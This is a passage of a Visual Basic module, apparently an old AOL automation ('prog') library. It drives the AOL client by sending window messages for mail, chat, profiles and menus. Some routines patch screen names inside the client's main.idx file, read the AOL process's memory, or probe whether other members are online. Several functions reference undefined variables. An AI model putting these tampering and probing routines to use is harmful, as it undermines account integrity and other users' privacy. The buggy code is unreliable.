        SetAttr TheFile$, vbArchive
    End If
End Sub
Public Sub FileSetSystem(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbSystem
    End If
End Sub
Public Sub FileSetNormal(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbNormal
    End If
End Sub
Public Sub FileSetReadOnly(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbReadOnly
    End If
End Sub
Public Sub FileSetHidden(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbHidden
    End If
End Sub
Public Function GetFromINI(Section As String, Key As String, Directory As String) As String
   Dim strBuffer As String
   strBuffer = String(750, Chr(0))
   Key$ = LCase$(Key$)
   GetFromINI$ = Left(strBuffer, GetPrivateProfileString(Section$, ByVal Key$, "", strBuffer, Len(strBuffer), Directory$))
End Function
Public Sub WriteToINI(Section As String, Key As String, KeyValue As String, Directory As String)
    Call WritePrivateProfileString(Section$, UCase$(Key$), KeyValue$, Directory$)
End Sub
Public Function CheckIfMaster() As Boolean
    Dim AOL As Long, MDI As Long, pWindow As Long
    Dim pButton As Long, modal As Long, mStatic As Long
    Dim mString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Call KeyWord("aol://4344:1580.prntcon.12263709.564517913")
    Do
        DoEvents
        pWindow& = FindWindowEx(MDI&, 0&, "AOL Child", " Parental Controls")
        pButton& = FindWindowEx(pWindow&, 0&, "_AOL_Icon", vbNullString)
    Loop Until pWindow& <> 0& And pButton& <> 0&
    Pause 1
    Do
        DoEvents
        Call PostMessage(pButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call PostMessage(pButton&, WM_LBUTTONUP, 0&, 0&)
        Pause 0.8
        modal& = FindWindow("_AOL_Modal", vbNullString)
        mStatic& = FindWindowEx(modal&, 0&, "_AOL_Static", vbNullString)
        mString$ = GetText(mStatic&)
    Loop Until modal& <> 0 And mStatic& <> 0& And mString$ <> ""
    mString$ = ReplaceString(mString$, Chr(10), "")
    mString$ = ReplaceString(mString$, Chr(13), "")
    If mString$ = "Set Parental Controls" Then
        CheckIfMaster = True
    Else
        CheckIfMaster = False
    End If
    Call PostMessage(modal&, WM_CLOSE, 0&, 0&)
    DoEvents
    Call PostMessage(pWindow&, WM_CLOSE, 0&, 0&)
End Function
Public Function GetCaption3(WindowHandle As Long) As String
    Dim buffer As String, TextLength As Long
    TextLength& = GetWindowTextLength(WindowHandle&)
    buffer$ = String(TextLength&, 0&)
    Call GetWindowText(WindowHandle&, buffer$, TextLength& + 1)
    GetCaption3$ = buffer$
End Function
Function GetLineCount(heh As Control)
'This will get the number of lines in
'a Textbox or string
If heh = "" Then
GetLineCount = 0
Else
theview$ = heh
For FindChar = 1 To Len(theview$)
DoEvents
thechar$ = Mid(theview$, FindChar, 1)
If thechar$ = Chr(13) Then
numline = numline + 1
End If
Next FindChar
If Mid(heh, Len(heh), 1) = Chr(13) Then
GetLineCount = numline
Else
GetLineCount = numline + 1
End If
End If
End Function
Public Function GetComboIndex(cb As ComboBox, Txt As String) As Integer
'finds the index of a specific word
Dim index As Integer
With cb
For index = 0 To .ListCount - 1
If .List(iIndex) = Txt Then
GetComboIndex = index
Exit Function
End If
Next index
End With
GetComboIndex = index
End Function
Public Function GetListIndex(LB As ListBox, Txt As String) As Integer
'finds the index of a specific word
Dim index As Integer
With LB
For index = 0 To .ListCount - 1
If LB.List(iIndex) = Txt Then
GetListIndex = index
Exit Function
End If
Next index
End With
GetListIndex = index
End Function
Function GetSquareRoot(num As Integer)
'gets the square root of the number specified
GetSquareRoot = Sqr(num)
End Function
Function GetFileLength1(Path As String)
'gets length of file in bytes
GetFileLength1 = FileLen(Path)
End Function
Function GetFileLength2(Path As String)
'gets length of file in kilobytes
GetFileLength2 = FileLen(Path) / 1000
End Function
Function GetFileLength3(Path As String)
'gets length of file in megabytes
GetFileLength3 = FileLen(Path) / 1000 / 1000
End Function
Function GetFileDateTimeStamp(Path As String)
'gets date and time file was added
GetFileDateTimeStamp = FileDateTime(Path)
End Function
Public Function GetListText(WindowHandle As Long) As String
    Dim buffer As String, TextLength As Long
    TextLength& = SendMessage(WindowHandle&, LB_GETTEXTLEN, 0&, 0&)
    buffer$ = String(TextLength&, 0&)
    Call SendMessageByString(WindowHandle&, LB_GETTEXT, TextLength& + 1, buffer$)
    GetListText$ = buffer$
End Function
Public Function GetText1(WindowHandle As Long) As String
    Dim buffer As String, TextLength As Long
    TextLength& = SendMessage(WindowHandle&, WM_GETTEXTLENGTH, 0&, 0&)
    buffer$ = String(TextLength&, 0&)
    Call SendMessageByString(WindowHandle&, WM_GETTEXT, TextLength& + 1, buffer$)
    GetText1$ = buffer$
End Function
Public Sub Button(mButton As Long)
    Call SendMessage(mButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(mButton&, WM_KEYUP, VK_SPACE, 0&)
End Sub
Public Sub icon(aIcon As Long)
    Call SendMessage(aIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(aIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub CloseWindow(Window As Long)
    Call PostMessage(Window&, WM_CLOSE, 0&, 0&)
End Sub
Public Function ProfileGet(ScreenName As String) As String
    Dim AOL As Long, tool As Long, toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim MDI As Long, pgWindow As Long, pgEdit As Long, pgButton As Long
    Dim pWindow As Long, pTextWindow As Long, pString As String
    Dim NoWindow As Long, OKButton As Long, CurPos As POINTAPI
    Dim WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        pgWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Get a Member's Profile")
        pgEdit& = FindWindowEx(pgWindow&, 0&, "_AOL_Edit", vbNullString)
        pgButton& = FindWindowEx(pgWindow&, 0&, "_AOL_Icon", vbNullString)
    Loop Until pgWindow& <> 0& And pgEdit& <> 0& And pgButton& <> 0&
    Call SendMessageByString(pgEdit&, WM_SETTEXT, 0&, ScreenName$)
    Call SendMessage(pgButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(pgButton&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Do
        DoEvents
        pWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Member Profile")
        pTextWindow& = FindWindowEx(pWindow&, 0&, "_AOL_View", vbNullString)
        Pause 0.5
        pString$ = GetText(pTextWindow&)
       NoWindow& = FindWindow("#32770", "America Online")
    Loop Until pWindow& <> 0& And pTextWindow& <> 0& Or NoWindow& <> 0&
    DoEvents
    If NoWindow& <> 0& Then
        OKButton& = FindWindowEx(NoWindow&, 0&, "Button", "OK")
        Call SendMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call SendMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        ProfileGet$ = "No profile available for this person."
    Else
        Call PostMessage(pWindow&, WM_CLOSE, 0&, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        ProfileGet$ = pString$
    End If
   End Function
Public Function GetUser() As String
    Dim AOL As Long, MDI As Long, welcome As Long
    Dim child As Long, UserString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    UserString$ = GetCaption(child&)
    If InStr(UserString$, "Welcome, ") = 1 Then
        UserString$ = Mid$(UserString$, 10, (InStr(UserString$, "!") - 10))
        GetUser$ = UserString$
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            UserString$ = GetCaption(child&)
            If InStr(UserString$, "Welcome, ") = 1 Then
                UserString$ = Mid$(UserString$, 10, (InStr(UserString$, "!") - 10))
                GetUser$ = UserString$
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    GetUser$ = ""
End Function
Public Sub Pause(Duration As Long)
    Dim Current As Long
    Current = Timer
    Do Until Timer - Current >= Duration
        DoEvents
    Loop
End Sub
Public Sub StopMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("stop " & MIDIFile$, 0&, 0, 0)
    End If
End Sub
Public Sub StartMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("play " & MIDIFile$, 0&, 0, 0)
    End If
End Sub
Sub ListSetIndex(Window%, index As Integer)
Call SendMessage(Window%, LB_SETCURSEL, ByVal CLng(index), ByVal 0&)
End Sub
Sub ComboSetIndex(Window%, index As Integer)
Call SendMessage(Window%, CB_SETCURSEL, ByVal CLng(index), ByVal 0&)
End Sub
Public Function ListToMailString(thelist As ListBox) As String
    Dim DoList As Long, MailString As String
    If thelist.List(0) = "" Then Exit Function
    For DoList& = 0 To thelist.ListCount - 1
        MailString$ = MailString$ & "(" & thelist.List(DoList&) & "), "
    Next DoList&
    MailString$ = Mid(MailString$, 1, Len(MailString$) - 2)
    ListToMailString$ = MailString$
End Function
Public Sub FormOnTop(FormName As Form)
    Call SetWindowPos(FormName.hwnd, HWND_TOPMOST, 0&, 0&, 0&, 0&, FLAGS)
End Sub
Public Sub FormNotOnTop(FormName As Form)
    Call SetWindowPos(FormName.hwnd, HWND_NOTOPMOST, 0&, 0&, 0&, 0&, FLAGS)
End Sub
Public Sub FormRollUp(frm As Form)
   frm.Height = 1
End Sub
Public Sub FormRollDown(frm As Form, num As Integer)
   frm.Height = num
End Sub
Public Sub FormDrag(TheForm As Form)
    Call ReleaseCapture
    Call SendMessage(TheForm.hwnd, WM_SYSCOMMAND, WM_MOVE, 0)
End Sub
Public Sub FormExitDown(TheForm As Form)
    Do
        DoEvents
        TheForm.Top = Trim(str(Int(TheForm.Top) + 300))
    Loop Until TheForm.Top > 7200
End Sub
Public Sub FormExitLeft(TheForm As Form)
    Do
        DoEvents
        TheForm.Left = Trim(str(Int(TheForm.Left) - 300))
    Loop Until TheForm.Left < -TheForm.Width
End Sub
Public Sub FormExitRight(TheForm As Form)
    Do
        DoEvents
        TheForm.Left = Trim(str(Int(TheForm.Left) + 300))
    Loop Until TheForm.Left > Screen.Width
End Sub
Public Sub FormExitUp(TheForm As Form)
    Do
        DoEvents
        TheForm.Top = Trim(str(Int(TheForm.Top) - 300))
    Loop Until TheForm.Top < -TheForm.Width
End Sub
Public Sub WindowHide(hwnd As Long)
    Call ShowWindow(hwnd&, SW_HIDE)
End Sub
Public Sub WindowShow(hwnd As Long)
    Call ShowWindow(hwnd&, SW_SHOW)
End Sub
Sub ClearText(hwnd)
SendMessageByString hwnd, EM_SETSEL, 0, -1
SetText hwnd, ""
End Sub
Public Sub runmenu2(TopMenu As Long, SubMenu As Long)
    Dim AOL As Long, aMenu As Long, sMenu As Long, mnID As Long
    Dim mVal As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    aMenu& = GetMenu(AOL&)
    sMenu& = GetSubMenu(aMenu&, TopMenu&)
    mnID& = GetMenuItemID(sMenu&, SubMenu&)
    Call SendMessageLong(AOL&, WM_COMMAND, mnID&, 0&)
End Sub
Public Sub RunMenuByString3(SearchString As String)
    Dim AOL As Long, aMenu As Long, mCount As Long
    Dim LookFor As Long, sMenu As Long, sCount As Long
    Dim LookSub As Long, sID As Long, sString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    aMenu& = GetMenu(AOL&)
    mCount& = GetMenuItemCount(aMenu&)
    For LookFor& = 0& To mCount& - 1
        sMenu& = GetSubMenu(aMenu&, LookFor&)
        sCount& = GetMenuItemCount(sMenu&)
        For LookSub& = 0 To sCount& - 1
            sID& = GetMenuItemID(sMenu&, LookSub&)
            sString$ = String$(100, " ")
            Call GetMenuString(sMenu&, sID&, sString$, 100&, 1&)
            If InStr(LCase(sString$), LCase(SearchString$)) Then
                Call SendMessageLong(AOL&, WM_COMMAND, sID&, 0&)
                Exit Sub
            End If
        Next LookSub&
    Next LookFor&
End Sub
Public Sub SpiralScroll(what$)
wowlen = Len(what$)
wowsend$ = what$ + ""
ChatSend (wowsend$)
Pause 1
For X = 1 To wowlen
    wowbck$ = Mid(wowsend$, 1, 1)
    wownew$ = Mid(wowsend$, 2, wowlen)
    wowsend$ = wownew$ + wowbck$
    ChatSend (wowsend$)
    Pause 0.7
Next X
ChatSend (what$)
End Sub
Sub SendEscape(hwnd%)
    sucs = SendMessage(hwnd, WM_KEYDOWN, VK_ESCAPE, 0&)
    sucs = SendMessage(hwnd, WM_KEYUP, VK_ESCAPE, 0&)
    sucs = SendMessage(hwnd, WM_CHAR, 27, 0)
End Sub
Sub KillKWNotFoundMsg()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
NF% = FindChildByTitle(MDI%, "keyword Not Found")
Call HideWindow(NF%)
End Sub
Public Function Checkonline(Person As String) As Boolean
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim Available As Long, Available1 As Long, Available2 As Long
    Dim Available3 As Long, oWindow As Long, oButton As Long
    Dim oStatic As Long, oString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call KeyWord("aol://9293:" & Person$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        Available1& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        Available2& = FindWindowEx(im&, Available1&, "_AOL_Icon", vbNullString)
        Available3& = FindWindowEx(im&, Available2&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available3&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich <> 0& And Available& <> 0& And Available& <> Available1& And Available& <> Available2& And Available& <> Available3&
    DoEvents
    Call SendMessage(Available&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(Available&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        oWindow& = FindWindow("#32770", "America Online")
        oButton& = FindWindowEx(oWindow&, 0&, "Button", "OK")
    Loop Until oWindow& <> 0& And oButton& <> 0&
    Do
        DoEvents
        oStatic& = FindWindowEx(oWindow&, 0&, "Static", vbNullString)
        oStatic& = FindWindowEx(oWindow&, oStatic&, "Static", vbNullString)
        oString$ = GetText(oStatic)
    Loop Until oStatic& <> 0& And Len(oString$) > 15
    If InStr(oString$, "is not currently signed on.") <> 0 Then
        Checkonline = True
        Else
        Checkonline = False
       End If
       Call SendMessage(oButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(oButton&, WM_KEYUP, VK_SPACE, 0&)
    Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End Function
Sub RemoveItemFromLB(Lst As ListBox, item$)
Do
NoFreeze% = DoEvents()
If LCase$(Lst.List(A)) = LCase$(item$) Then Lst.RemoveItem (A)
A = 1 + A
Loop Until A >= Lst.ListCount
End Sub
Sub RemoveItemFromCB(cmb As ComboBox, item$)
Do
NoFreeze% = DoEvents()
If LCase$(cmb.List(A)) = LCase$(item$) Then cmb.RemoveItem (A)
A = 1 + A
Loop Until A >= cmb.ListCount
End Sub
Public Function AOL40_RoomFull()
Dim Button%
Do
timeout 0.00002
msg1% = FindWindow("#32770", "America Online")
Button% = FindChildByClass(msg1%, "Button")
stat% = FindChildByClass(msg1%, "Static")
statcap% = FindChildByTitle(msg1%, "The room you requested is full.")
If stat% <> 0 And Button% <> 0 And statcap% <> 0 Then Call ClickIcon(Button%)
Loop Until msg1% = 0
End Function
Sub RunAOLToolBar(tool)
Dim icon%
Dim X
Dim isen%
Dim tbr$
tbr = FindChildByClass(AOLWin(), "AOL Toolbar")
icon% = FindChildByClass(tbr, "_AOL_Icon")
For X = 1 To tool - 1
icon% = GetWindow(iconz%, 2)
Next X
isen% = IsWindowEnabled(icon%)
If isen% = 0 Then Exit Sub
ClickIcon (iconz%)
End Sub
Function GetScreenFontCount()
  GetScreenFontCount = Screen.FontCount
End Function
Sub AddSysFontscb(cmb As ComboBox)
For I = 0 To Screen.FontCount - 1
    cmb.AddItem Screen.Fonts(I)
Next I
End Sub
Sub AddSysFontslb(Lst As ListBox)
For I = 0 To Screen.FontCount - 1
    Lst.AddItem Screen.Fonts(I)
Next I
End Sub
Function AOLGetListString(Parent, index, buffer As String)
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
AOLHandle = Parent
AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call CloseHandle(AOLProcessThread)
End If
buffer$ = Person$
End Function
Sub AOLClickSignOn()
AOL% = AOLFindSignOn()
AOL% = FindChildByClass(AOL%, "_AOL_Icon")
AOL% = GetWindow(AOL%, GW_HWNDNEXT)
AOL% = GetWindow(AOL%, GW_HWNDNEXT)
AOLClickIcon (AOL%)
End Sub
Function AOLFindGuest()
AOL% = AOLModal()
AOL% = FindChildByClass(AOL%, "_AOL_Static")
TheGuest = GetCaption(AOL%)
If TheGuest = "Guest Sign-On:" Then AOLFindGuest = 1: Exit Function
AOLFindGuest = 0
End Function
Function AOLFindSignOn()
AOL% = FindChildByTitle(AOLMDI(), "Sign On")
If AOL% = 0 Then AOL% = FindChildByTitle(AOLMDI(), "Goodbye from America Online!")
AOLFindSignOn = AOL%
End Function
Sub GuestSetSNPW(TheSN, ThePW)
AOL% = AOLModal()
AOL% = FindChildByClass(AOL%, "_AOL_Edit")
X = SendMessageByString(AOL%, WM_SETTEXT, 0, TheSN)
AOL% = GetWindow(AOL%, GW_HWNDNEXT)
AOL% = GetWindow(AOL%, GW_HWNDNEXT)
X = SendMessageByString(AOL%, WM_SETTEXT, 0, ThePW)
End Sub
Function AOLModal()
AOLModal = FindWindow("_AOL_Modal", vbNullString)
End Function
Function AOLModal2() As Boolean
AOLModal2 = FindWindow("_AOL_Modal", vbNullString)
If AOLModal2 <> 0 Then
AOLModal2 = True
Else: AOLModal2 = False
End If
End Function
Sub SetCheckBoxToFalse(win%)
Check% = SendMessageByNum(win%, BM_SETCHECK, False, 0&)
End Sub
Sub SetCheckBoxToTrue(win%)
Check% = SendMessageByNum(win%, BM_SETCHECK, True, 0&)
End Sub
Sub ChatRollDice(Dice, Side)
ChatSend "//roll-dice " & Dice & "-sides " & Side
End Sub
Sub ClickForward()
mailwin% = FindChildByClass(AOLMDI(), "AOL Child")
AOIcon% = FindChildByClass(mailwin%, "_AOL_Icon")
For l = 1 To 8
AOIcon% = GetWindow(AOIcon%, 2)
NoFreeze% = DoEvents()
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickReply()
mailwin% = FindChildByClass(AOLMDI(), "AOL Child")
AOIcon% = FindChildByClass(mailwin%, "_AOL_Icon")
For l = 1 To 6
AOIcon% = GetWindow(AOIcon%, 2)
NoFreeze% = DoEvents()
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickReplyToAll()
mailwin% = FindChildByClass(AOLMDI(), "AOL Child")
AOIcon% = FindChildByClass(mailwin%, "_AOL_Icon")
For l = 1 To 10
AOIcon% = GetWindow(AOIcon%, 2)
NoFreeze% = DoEvents()
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickKeepAsNew()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, GetUser & "'s Online Mailbox")
AOIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 2
AOIcon% = GetWindow(AOIcon%, 2)
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickNext()
mailwin% = FindChildByClass(AOLMDI(), "AOL Child")
AOIcon% = FindChildByClass(mailwin%, "_AOL_Icon")
For l = 1 To 5
AOIcon% = GetWindow(AOIcon%, 2)
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickPrevious()
mailwin% = FindChildByClass(AOLMDI(), "AOL Child")
AOIcon% = FindChildByClass(mailwin%, "_AOL_Icon")
For l = 1 To 3
AOIcon% = GetWindow(AOIcon%, 2)
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickStatus()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, GetUser & "'s Online Mailbox")
AOIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 1
AOIcon% = GetWindow(AOIcon%, 2)
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickUnsend()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, GetUser & "'s Online Mailbox")
AOIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 4
AOIcon% = GetWindow(AOIcon%, 2)
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickAttachFile()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, "Write Mail")
AOIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 13
AOIcon% = GetWindow(AOIcon%, 2)
Next l
AOLClickIcon (AOIcon%)
End Sub
Function CheckReturnReceipts(val As Boolean)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, "Write Mail")
AOIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 17
AOIcon% = GetWindow(AOIcon%, 2)
Next l
Check% = SendMessageByNum(AOIcon%, BM_SETCHECK, val, 0&)
End Function
Sub ClickSend()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, "Write Mail")
AOIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 18
AOIcon% = GetWindow(AOIcon%, 2)
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickRead()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, GetUser & "'s Online Mailbox")
AOIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 0
AOIcon% = GetWindow(AOIcon%, 2)
Next l
AOLClickIcon (AOIcon%)
End Sub
Sub ClickSendAndForwardMail(Recipiants)
AOL% = FindWindow("AOL Frame25", vbNullString)
Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Fwd: ")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)
For GetIcon = 1 To 14
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon
AOLClickIcon (AOIcon%)
Do: DoEvents
AOMail% = FindChildByTitle(MDI%, "Fwd: ")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
Loop Until AOEdit% = 0
End Sub
Sub SNReset(SN$, aoldir$, Replace$)
l0036 = Len(SN$)
Select Case l0036
Case 3
I = SN$ + "       "
Case 4
I = SN$ + "      "
Case 5
I = SN$ + "     "
Case 6
I = SN$ + "    "
Case 7
I = SN$ + "   "
Case 8
I = SN$ + "  "
Case 9
I = SN$ + " "
Case 10
I = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
X = 1
Do Until 2 > 3
Text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
Text$ = String(32000, 0)
Get #1, X, Text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, Text$, I, 1)
If Where1 Then
Mid(Text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, X + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, Text$, I, 1)
If Where2 Then
Mid(Text$, Where2) = Replace$
Put #2, X + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
X = X + 32000
LF2 = LOF(2)
Close #2
If X > LF2 Then GoTo 301
Loop
301:
End Sub
Sub ghost()
bdy% = FindChildByTitle(AOLMDI, "Buddy List Window")
If bdy% = 0 Then
PoPup 5, "b"
GoTo fin
End If
Do
    DoEvents
    bdy% = FindChildByTitle(AOLMDI, "Buddy List Window")
    Ico% = FindChildByClass(bdy%, "_AOL_Icon")
Loop Until bdy% <> 0
For ing = 1 To 4
Ico% = GetWindow(Ico%, GW_HWNDNEXT)
Next ing
ClickIcon% Ico%
ClickIcon% Ico%
ClickIcon% Ico%
ClickIcon% Ico%
ClickIcon% Ico%
fin:
Do
    DoEvents
    scrn = GetUser
    bdy% = FindChildByTitle(AOLMDI, GetUser & "'s *")
Loop Until bdy% <> 0
Ico% = FindChildByClass(bdy%, "_AOL_Icon")
For ing = 1 To 4
Ico% = GetWindow(Ico%, GW_HWNDNEXT)
Next ing
ClickIcon Ico%
Do
    DoEvents
    prvy% = FindChildByTitle(AOLMDI, "Privacy Preferences")
    chk% = FindChildByClass(prvy%, "_AOL_Checkbox")
Loop Until chk% <> 0
KillWin bdy%
SendMessage chk%, &HF1, 1, 0
For ing = 1 To 5
chk% = GetWindow(chk%, GW_HWNDNEXT)
SendMessage chk%, &HF1, 1, 0
Next ing
For ing = 1 To 2
chk% = GetWindow(chk%, GW_HWNDNEXT)
Next ing
